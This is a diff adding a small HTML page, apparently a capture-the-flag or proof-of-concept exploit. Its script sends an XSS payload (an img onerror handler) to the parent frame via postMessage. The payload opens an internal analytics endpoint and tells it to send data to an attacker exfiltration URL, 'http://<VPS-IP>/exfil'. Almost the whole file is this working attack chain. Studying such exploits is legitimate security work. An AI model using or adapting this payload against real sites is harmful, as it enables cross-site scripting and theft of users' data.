@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Pop Page</title>
+	</head>
+	<body>
+		<h1>Pop Page</h1>
+		<script>
+			BASE_URL = 'http://analytics:3000';
+			EXFIL_URL = 'http://<VPS-IP>/exfil';
+
+			var payload = `
+			var win = window.open('${BASE_URL}/integrate', '_blank');
+			setTimeout(() => {
+				if (win) {
+					win.postMessage({
+						analytics: 1,
+						url: '${EXFIL_URL}'
+					}, '*');
+				}
+			}, 3000);
+			`
+
+			window.parent.postMessage({
+				payload: `<img src=x onerror="${payload}">`
+			}, '*');
+			
+		</script>
+	</body>
+</html>
